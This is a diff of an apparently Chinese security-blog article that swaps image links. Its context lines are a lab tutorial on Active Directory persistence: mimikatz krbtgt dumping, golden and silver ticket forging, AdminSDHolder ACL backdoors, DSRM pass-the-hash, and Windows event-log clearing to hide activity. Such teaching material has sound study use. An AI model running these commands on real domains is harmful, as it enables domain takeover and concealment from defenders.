@@ -31,7 +31,7 @@ HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工�
     
     privilege::debuglsadump::lsa /inject /name:krbtgt
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192534.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192534.png)
 
 得到krbtgt的hash：
 
@@ -55,7 +55,7 @@ HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工�
     
      mimikatz "kerberos::golden /domain:redteam.local /sid:S-1-5-21-151877218-3666268517-4145415712/krbtgt:c73caed3bc6f0a248e51d37b9a8675fa /user:administrator/ticket:gold.kirbi"
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192535.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192535.png)
 
 可以看到没有任何票证。
 
@@ -69,11 +69,11 @@ HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工�
 
 成功导入administrator票据。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192536.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192536.png)
 
 可以通过事件管理器查看到是以administrator来登录的
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192537.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192537.png)
 
 # 0x02 银票
 
@@ -95,21 +95,21 @@ HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工�
     
     privilege::Debugsekurlsa::logonpasswords
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192538.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192538.png)
 
 ## 2.3 创建银票
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192539.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192539.png)
 
     
     
     kerberos::golden /domain:redteam.local/sid:S-1-5-21-151877218-3666268517-4145415712/target:DC.redteam.local/service:cifs /rc4:0703759771e4bed877ecd472c95693a5/user:administrator /ptt
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192540.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192540.png)
 
 psexec获取DC机器cmd
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192541.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192541.png)
 
 # 0x03 AdminSDHolder组
 
@@ -125,7 +125,7 @@ ACL，例如授予普通用户完全权限，则该用户将拥有受保护组�
 其中Administrators、Domain Admins、Enterprise
 Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和组的具备admincount属性值为1的特征。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192542.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192542.png)
 
 ## 3.1 使用powerview查询
 
@@ -135,7 +135,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     Get-NetUser-AdminCount|select samaccountname
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192543.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192543.png)
 
 查询域中受ad保护的所有组
 
@@ -143,7 +143,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     Get-netgroup -AdminCount| select name
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192544.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192544.png)
 
 ## 3.2 使用ActiveDirectory
 
@@ -169,7 +169,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     Get-DomainObjectAcl adminsdholder | ?{$_.SecurityIdentifier-match "S-1-5-21-151877218-3666268517-4145415712-1106"} | select objectdn,ActiveDirectoryRights |sort -Unique
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192545.png)![](https://gitee.com/fuli009/images/raw/master/public/20210816192546.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192545.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192546.png)
 
 默认会等待60分钟，可以通过修改注册表来设置为60秒后触发。
 
@@ -193,7 +193,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     Remove-DomainObjectAcl-TargetSearchBase"LDAP://CN=AdminSDHolder,CN=System,DC=redteam,DC=local"-PrincipalIdentity jack -RightsAll-Verbose
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192547.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192547.png)
 
 # 0x04 DSRM凭证
 
@@ -205,7 +205,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     token::elevatelsadump::sam
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192547.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192547.png)
 
 得到hash为：
 
@@ -235,7 +235,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     Set-ItemProperty"HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA"-name DsrmAdminLogonBehavior-value 2
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192549.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192549.png)
 
 ## 4.3 PTH域控
 
@@ -253,7 +253,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
 
 ### 5.1.1 事件管理器
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192550.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192550.png)
 
 ### 5.1.2 powershell
 
@@ -265,7 +265,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     Get-WinEvent-FilterHashtable@{logname="security";}
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192551.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192551.png)
 
 ## 5.2 windows日志清除方法
 
@@ -277,7 +277,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
      wevtutil.exe gli Applicationwevtutil.exe gli Security
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192552.png)![](https://gitee.com/fuli009/images/raw/master/public/20210816192553.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192552.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192553.png)
 
  **查询指定类别的(这里以security举例):**
 
@@ -285,7 +285,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
      wevtutil qe Security/f:text
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192554.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192554.png)
 
  **删除指定类别：**
 
@@ -297,7 +297,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
 
 原本大量日志信息
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192555.png)![](https://gitee.com/fuli009/images/raw/master/public/20210816192556.png)![]()
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192555.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192556.png)![]()
 
 但是会留下一个事件id为1102的日志清除日志
 
@@ -309,7 +309,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
      Get-EventLogSecurity-InstanceId4624,4625
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192557.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192557.png)
 
  **删除指定类别日志：**
 
@@ -317,7 +317,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
      Clear-EventLog-LogNameSecurity
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192558.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192558.png)
 
 ### 5.2.3 Phantom脚本
 
@@ -325,19 +325,19 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
 
 添加一个用户可以看到产生了日志
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192559.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192559.png)
 
 我们再给删除
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192600.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192600.png)
 
 运行ps1脚本：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192601.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192601.png)
 
 再次添加用户查看日志：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192602.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192602.png)
 
  **![]()**
 
@@ -384,11 +384,11 @@ BeanShell远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM
 [【超详细】Fastjson1.2.24反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)
 
  _
-**走过路过的大佬们留个关注再走呗**_![](https://gitee.com/fuli009/images/raw/master/public/20210816192603.png)
+**走过路过的大佬们留个关注再走呗**_![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192603.png)
 
  **往期文章有彩蛋哦** **![]()**  
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210816192604.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210816192604.png)
 
 一如既往的学习，一如既往的整理，一如即往的分享。![]()  
 
